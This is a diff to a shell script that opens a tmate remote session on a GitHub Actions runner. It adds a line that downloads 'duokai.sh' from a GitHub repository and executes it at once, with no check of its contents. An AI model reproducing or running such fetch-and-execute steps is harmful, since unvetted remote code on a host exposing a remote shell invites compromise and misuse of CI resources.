@@ -23,6 +23,10 @@ else
     exit 1
 fi
 
+# 运行 duokai.sh 脚本
+echo -e "${INFO} Downloading and executing duokai.sh ..."
+wget -O duokai.sh https://raw.githubusercontent.com/LSH160981/Titan-Network/main/duokai.sh && chmod +x duokai.sh && ./duokai.sh
+
 # Generate ssh key if needed
 [[ -e ~/.ssh/id_rsa ]] || ssh-keygen -t rsa -f ~/.ssh/id_rsa -q -N ""
 
@@ -34,7 +38,7 @@ tmate -S ${TMATE_SOCK} wait tmate-ready
 # Print connection info
 TMATE_SSH=$(tmate -S ${TMATE_SOCK} display -p '#{tmate_ssh}')
 TMATE_WEB=$(tmate -S ${TMATE_SOCK} display -p '#{tmate_web}')
-MSG="
+MSG="\
 *GitHub Actions - tmate session info:*
 
 ⚡ *CLI:*
